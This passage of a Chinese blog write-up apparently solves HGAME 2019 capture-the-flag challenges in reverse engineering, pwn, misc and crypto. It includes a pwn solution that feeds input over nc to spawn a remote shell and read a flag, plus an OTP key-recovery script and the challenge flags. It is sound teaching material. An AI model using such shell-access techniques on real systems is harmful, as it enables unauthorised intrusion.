class="number">5</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>,]</span><br><span class="line">v7 = [<span class="number">8</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>,</span><br><span class="line">      <span class="number">11</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure><p>然后一拼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> [x * <span class="number">16</span> + y <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(v6, v7)]:</span><br><span class="line">    print(chr(c), end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>得到最后结果<code>hgame{1_think_Matr1x_is_very_usef5l}</code></p><h3 id="4-r-xor"><a class="markdownIt-Anchor" href="#4-r-xor"></a> 4. r &amp; xor</h3><h4 id="question-8"><a class="markdownIt-Anchor" href="#question-8"></a> Question</h4><p>Description</p><p>论r 与 xor 的重要性 ida里奇怪的大数字?不如按r试一试</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/xor" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/xor</a></p><p>Base Score</p><p>100</p><h4 id="answer-8"><a class="markdownIt-Anchor" href="#answer-8"></a> Answer</h4><p>显然先拉到IDA里去，看一下main：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">int</span> v5[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+94h] [rbp-ACh]</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+A0h] [rbp-A0h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+A8h] [rbp-98h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+B0h] [rbp-90h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+B8h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [rsp+C0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+D0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v36; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v36 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v30 = <span class="number">3483951462304802664L</span>L;</span><br><span class="line">  v31 = <span class="number">6859934930880520053L</span>L;</span><br><span class="line">  v32 = <span class="number">3560223458491458926L</span>L;</span><br><span class="line">  v33 = <span class="number">2387225997007150963L</span>L;</span><br><span class="line">  v34 = <span class="number">8200481</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  ...</span><br><span class="line">  v29 = <span class="number">30</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the flag:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">35</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">35</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[i] != (v5[i] ^ *((<span class="keyword">char</span> *)&amp;v30 + i)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong flag , try again later!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You are right! Congratulations!!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong flag , try again later!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下来，其实flag就是<code>s[i] == (v5[i] ^ *((char *)&amp;v30 + i))</code>成立</p><p>i从0-34，其实对应的就是v5一直到v29的数，但是看这些的地址，中间是有空隙的，所以要补0，最后拿到这前面的35个数分别是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0, 0, 0, 0, 0, 0, 1, 0, 7, 0, 92, 18, 38, 11, 93, 43, 11, 23, 0, 23, 43, 69, 6, 86, 44, 54, 67, 0, 66, 85, 126,</span><br><span class="line">      72, 85, 30, 0]</span><br></pre></td></tr></table></figure><p>后面的就对应着</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v30 &#x3D; 3483951462304802664LL;</span><br><span class="line">v31 &#x3D; 6859934930880520053LL;</span><br><span class="line">v32 &#x3D; 3560223458491458926LL;</span><br><span class="line">v33 &#x3D; 2387225997007150963LL;</span><br><span class="line">v34 &#x3D; 8200481;</span><br></pre></td></tr></table></figure><p>一开始我就直接拼起来，化成Hex，然后按照char取出来进行异或运算，结果出来一堆奇怪的东西。</p><p>然后看到提示，说要按 R？</p><p>然后就变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v30 &#x3D; &#39;0Y&#123;emagh&#39;;</span><br><span class="line">v31 &#x3D; &#39;_3byam_u&#39;;</span><br><span class="line">v32 &#x3D; &#39;1ht_deen&#39;;</span><br><span class="line">v33 &#x3D; &#39;!!!en0_s&#39;;</span><br><span class="line">v34 &#x3D; &#39;&#125;!!&#39;;</span><br></pre></td></tr></table></figure><p>嗯嗯嗯？？？</p><p>（应该是地址是减小的，所以要反过来拼）</p><p>显然要的就是<code>hgame{Y0u_mayb3_need_th1s_0ne!!!!!}</code></p><p>我直接提交了一下，发现并不行。</p><p>然后再拿着前面那个35个数字异或一下，变成了</p><p><code>hgame{X0r_1s_interest1ng_isn't_it?}</code></p><p>没错就是这个。</p><h3 id="5-pro的python教室一"><a class="markdownIt-Anchor" href="#5-pro的python教室一"></a> 5. Pro的Python教室(一)</h3><h4 id="question-9"><a class="markdownIt-Anchor" href="#question-9"></a> Question</h4><p>Description</p><p>Easiest Python Challenge!</p><p>URL</p><p><a href="http://plqbnxx54.bkt.clouddn.com/first.py" target="_blank" rel="noopener">http://plqbnxx54.bkt.clouddn.com/first.py</a></p><p>Base Score</p><p>100</p><h4 id="answer-9"><a class="markdownIt-Anchor" href="#answer-9"></a> Answer</h4><p>点开网页，得到源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">'hgame&#123;'</span></span><br><span class="line">enc2 = <span class="string">'SGVyZV8xc18zYXN5Xw=='</span></span><br><span class="line">enc3 = <span class="string">'Pyth0n&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Welcome to Processor\'s Python Classroom!\n'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Here is Problem One.'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'There\'re three parts of the flag.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'------------------------------------------------'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Plz input the first part:'</span></span><br><span class="line">first = raw_input()</span><br><span class="line"><span class="keyword">if</span> first == enc1:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sorry , You\'re so vegatable!'</span></span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Plz input the secend part:'</span></span><br><span class="line">secend = raw_input()</span><br><span class="line">secend = base64.b64encode(secend)</span><br><span class="line"><span class="keyword">if</span> secend == enc2:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sorry , You\'re so vegatable!'</span></span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Plz input the third part:'</span></span><br><span class="line">third = raw_input()</span><br><span class="line">third = base64.b32decode(third)</span><br><span class="line"><span class="keyword">if</span> third == enc3:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sorry , You\'re so vegatable!'</span></span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Oh, You got it !'</span></span><br></pre></td></tr></table></figure><p>从<code>secend = base64.b64encode(secend)看出来</code>，里面的<code>enc2</code>明显就是base64编码了，然后base64解码之后，把<code>enc1,2,3</code>拼起来就是了。</p><p><code>SGVyZV8xc18zYXN5Xw==</code>解码得到<code>Here_1s_3asy_</code></p><p>最后flag就是<code>hgame{Here_1s_3asy_Pyth0n}</code></p><p>（enc3这个不是应该也要加密一下么。。但是我忘了，但但是就过了。。。）</p><h2 id="iii-pwn"><a class="markdownIt-Anchor" href="#iii-pwn"></a> Ⅲ PWN</h2><h4 id="2-aaaaaaaaaa"><a class="markdownIt-Anchor" href="#2-aaaaaaaaaa"></a> 2. aaaaaaaaaa</h4><h4 id="question-10"><a class="markdownIt-Anchor" href="#question-10"></a> Question</h4><p>Description</p><p>pwn很简单的，a上去就完事了 nc 118.24.3.214 9999</p><p>URL</p><p><a href="http://plps4kyke.bkt.clouddn.com/aaaaaaaaaa" target="_blank" rel="noopener">http://plps4kyke.bkt.clouddn.com/aaaaaaaaaa</a></p><p>Base Score</p><p>50</p><h4 id="answer-10"><a class="markdownIt-Anchor" href="#answer-10"></a> Answer</h4><p>下载这个文件，一把拉到IDA里，汇编看不来，看看C语言。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)handle);</span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to PWN'world!let us aaaaaaaaaa!!!"</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">99</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="number">97</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然要执行到<code>system(&quot;/bin/sh&quot;);</code>才能搞事情，所以就是要让<code>v3</code>大于99，那么看下来只要输入好多好多的<code>aaaaaaaaaaaaaaaa...</code>就行了。（具体来讲大于99个a）</p><blockquote><p>ubuntu@VM-0-10-ubuntu:~/bin$ nc 118.24.3.214 9999<br />Welcome to PWN’world!let us aaaaaaaaaa!!!<br />aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</p></blockquote><p>然后这里就多了一个光标，等待执行命令。</p><p>那就来个<code>ls</code>，看看有啥吧。</p><blockquote><p>ls<br />aaaaaaaaaa<br />bin<br />dev<br />flag<br />lib<br />lib64<br /><a href="http://run.sh" target="_blank" rel="noopener">run.sh</a></p></blockquote><p>哎呦，flag！那么打开flag就行了。</p><p>所以<code>vi flag</code>，结果：</p><blockquote><p>/bin/sh: 2: vi: not found</p></blockquote><p>没有？那我看看你有啥命令。。。</p><p>执行<code>cd bin</code>和<code>ls</code></p><blockquote><p>ls<br />cat<br />ls<br />sh<br />timeout</p></blockquote><p>好吧好吧…那就<code>cat flag</code></p><blockquote><p>cat flag<br />hgame{Aa4_4aA_4a4aAAA}</p></blockquote><p>那么flag就是<code>hgame{Aa4_4aA_4a4aAAA}</code></p><p>(这里好像回不去上级菜单，所以我就重新nc一遍了）</p><h2 id="iv-misc"><a class="markdownIt-Anchor" href="#iv-misc"></a> Ⅳ MISC</h2><h3 id="1-hidden-image-in-lsb"><a class="markdownIt-Anchor" href="#1-hidden-image-in-lsb"></a> 1. Hidden Image in LSB</h3><h4 id="question-11"><a class="markdownIt-Anchor" href="#question-11"></a> Question</h4><p>Description</p><p>Here are some magic codes which can hide information in an ordinary picture, can you extract the hidden image in the provided picture?<br />其实本来想让大家写写代码，后来干脆就送分了<br />有个神器叫 stegsolve，利用它可以直接提取本题 flag</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/lsb.zip" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/lsb.zip</a></p><p>Base Score</p><p>50</p><h4 id="answer-11"><a class="markdownIt-Anchor" href="#answer-11"></a> Answer</h4><p>这个就是看每个像素的最后一位，然后放进stegsolve，真的就出来了。</p><p><img src="/images/hgame-week1/flag_img.png" alt="flag_img" /></p><p>没错，flag就是<code>hgame{LSB_is_easy_for_u}</code></p><h3 id="2-打字机"><a class="markdownIt-Anchor" href="#2-打字机"></a> 2. 打字机</h3><p>Description</p><p>Aris(划掉)牌打字机，时尚时尚最时尚~<br />hint:谷歌有个以图搜图功能很不错，百度识图好垃圾的。。。</p><p>URL</p><p><a href="http://plps4kyke.bkt.clouddn.com/%E6%89%93%E5%AD%97%E6%9C%BA.zip" target="_blank" rel="noopener">http://plps4kyke.bkt.clouddn.com/打字机.zip</a></p><p>Base Score</p><p>50</p><h4 id="answer-12"><a class="markdownIt-Anchor" href="#answer-12"></a> Answer</h4><p>拿到zip后，发现里面有两张图片。</p><p><img src="/images/hgame-week1/flag.png" alt="flag" /></p><p><img src="/images/hgame-week1/type_writer.png" alt="type_writer" /></p><p>第一个看上去就像是hgame{…}的感觉，然后下面的这个键盘第一感觉就是对于QWERTY键盘。所以只要翻译一下就行了。</p><p>但是问题是flag里面有好多字母，下面都没有。</p><p>看来打字机上是大写，那么我们还需要小写版的对应表。</p><p>Google搜图之后发现了，早有牛人对出了小写版的。</p><p><img src="/images/hgame-week1/lower.png" alt="lower" /></p><p>翻译之后，就拿到了<code>hgame{My_vi0let_tyPewRiter}</code></p><h3 id="3broken-chest"><a class="markdownIt-Anchor" href="#3broken-chest"></a> 3.Broken Chest</h3><h4 id="question-12"><a class="markdownIt-Anchor" href="#question-12"></a> Question</h4><p>Description</p><p>这个箱子坏掉了！快用你无敌的[疯狂钻石]想想办法啊！<br />更新一波学习资料https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/</p><p>URL</p><p><a href="http://plqfgjy5a.bkt.clouddn.com/Broken-Chest.zip" target="_blank" rel="noopener">http://plqfgjy5a.bkt.clouddn.com/Broken-Chest.zip</a></p><p>Base Score</p><p>50</p><h4 id="answer-13"><a class="markdownIt-Anchor" href="#answer-13"></a> Answer</h4><p>拿到压缩包，结果坏了。</p><p>看十六进制，开头的50 4B 03 04被改了，改回来。</p><p>打开压缩包，结果flag.txt被锁住了。</p><p><del>但是可以看到大小是20B，CRC是b0b37cce</del></p><p><del>所以爆破这20B的内容，找到一样的CRC。</del></p><p><del>爆个头，爆完电脑都没了</del></p><p>突然发现压缩包里有个注释<code>S0mETh1ng_U5efuL</code>.</p><p>嗯？这就是密码？没错，用这个打开得到<code>hgame{Cra2y_D1aM0nd}</code></p><h2 id="v-crypto"><a class="markdownIt-Anchor" href="#v-crypto"></a> Ⅴ CRYPTO</h2><h3 id="1-mix"><a class="markdownIt-Anchor" href="#1-mix"></a> 1. Mix</h3><h4 id="question-13"><a class="markdownIt-Anchor" href="#question-13"></a> Question</h4><p>Description</p><p>–…/…-/…-/-…/–…/…–/…/…-./-…/-…/-…/…-./–…/----./…-/…-/–…/.----/-…/-…/–…/-…/-…/…—/…/.----/-…/-…/…–/…-/…–/-----/-…/…/–…/-… So easy</p><p>URL</p><p><a href="http://example.com/" target="_blank" rel="noopener">http://example.com</a></p><p>Base Score</p><p>50</p><h4 id="answer-14"><a class="markdownIt-Anchor" href="#answer-14"></a> Answer</h4><p>这玩意一看就是个摩斯电码，翻译一波。</p><p>结果拿到了<code>744B735F6D6F7944716B7B6251663430657D</code></p><p>感觉是个十六进制编码，然后按照ASCII码翻译一下，拿到了<code>tKs_moyDqk{bQf40e}</code></p><p>这个看上去好像就要成功了，但是还是莫名其妙的。</p><p>和我们想要的hgame{…}看上去，大小括号都有了，但是左大括号的位置不对。</p><p>两个一组进行栅栏重排，得到了<code>tsmyq{Q4eK_oDkbf0}</code></p><p>这个看上去就像是<code>hgame{...........}</code>的偏移版。</p><p>然后发现规律就是这个</p><blockquote><p>ABCDEFGHIJKLMNOPQRSTUVWXYZ<br />OPQRSTUVWXYZABCDEFGHIJKLMN</p></blockquote><p>全部对应下来就得到了<code>hgame{E4sY_cRypt0}</code></p><h3 id="2-perfect_secrecy"><a class="markdownIt-Anchor" href="#2-perfect_secrecy"></a> 2. perfect_secrecy!</h3><h4 id="question-14"><a class="markdownIt-Anchor" href="#question-14"></a> Question</h4><p>Description</p><p>Mom told me OTP is perfect secrecy!（结果加上hgame{}）</p><p>URL</p><p><a href="http://plqbnxx54.bkt.clouddn.com/easy_otp.py" target="_blank" rel="noopener">http://plqbnxx54.bkt.clouddn.com/easy_otp.py</a></p><p>Base Score</p><p>100</p><h4 id="answer-15"><a class="markdownIt-Anchor" href="#answer-15"></a> Answer</h4><p>拿到源码，看下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def strxor(a, b):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(hex(x ^ y)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> (x, y) in zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">'poem.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">flag = <span class="string">"*********************************"</span></span><br><span class="line">strings = fp.readlines()</span><br><span class="line">key = hex(random.randint(<span class="number">2</span>**<span class="number">511</span>, <span class="number">2</span>**<span class="number">512</span>))[<span class="number">2</span>:]</span><br><span class="line">strs = [strxor(i[:<span class="number">-3</span>], binascii.unhexlify(key)) <span class="keyword">for</span> i in strings]</span><br><span class="line">result = strxor(flag.encode(<span class="string">'utf-8'</span>), binascii.unhexlify(key))</span><br><span class="line"><span class="keyword">print</span>(strs)</span><br><span class="line"><span class="keyword">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">['</span>daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54<span class="string">',</span></span><br><span class="line"><span class="string">'</span>c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840b<span class="string">b',</span></span><br><span class="line"><span class="string">'</span>dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e<span class="string">',</span></span><br><span class="line"><span class="string">'</span>d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154<span class="string">',</span></span><br><span class="line"><span class="string">'</span>d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a<span class="string">',</span></span><br><span class="line"><span class="string">'</span>c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34<span class="string">',</span></span><br><span class="line"><span class="string">'</span>d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090<span class="string">',</span></span><br><span class="line"><span class="string">'</span>c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090<span class="string">',</span></span><br><span class="line"><span class="string">'</span>d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f<span class="string">',</span></span><br><span class="line"><span class="string">'</span>cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87<span class="string">',</span></span><br><span class="line"><span class="string">'</span>d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244<span class="string">',</span></span><br><span class="line"><span class="string">'</span>e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199<span class="string">',</span></span><br><span class="line"><span class="string">'</span>c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c<span class="string">',</span></span><br><span class="line"><span class="string">'</span>d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397<span class="string">',</span></span><br><span class="line"><span class="string">'</span>c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840<span class="string">',</span></span><br><span class="line"><span class="string">'</span>c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c<span class="string">']</span></span><br><span class="line"><span class="string">'</span>c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa<span class="string">'</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br></pre></td></tr></table></figure><p>可以看到，这个代码随机生成了一个512位的密码，然后对所有的字符串进行异或运算。</p><p>由于这个加密是按照一个字节一个字节算的，所以一开始我拿出了所有字符串的前两个。</p><p><code>['da','c5','dd','d9','d9','c4','d9','c4','d9','cc','d9','e1','c4','d9','c4','c5']</code></p><p>又因为异或两次会不变，所以我对上面的这些分别从0-255进行异或，然后去寻找那些恰好可以让所有的字符都是字母的值。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = [<span class="string">'da'</span>, <span class="string">'c5'</span>, <span class="string">'dd'</span>, <span class="string">'d9'</span>, <span class="string">'d9'</span>, <span class="string">'c4'</span>, <span class="string">'d9'</span>, <span class="string">'c4'</span>, <span class="string">'d9'</span>, <span class="string">'cc'</span>, <span class="string">'d9'</span>, <span class="string">'e1'</span>, <span class="string">'c4'</span>, <span class="string">'d9'</span>, <span class="string">'c4'</span>, <span class="string">'c5'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    answers = [chr(binascii.unhexlify(t)[<span 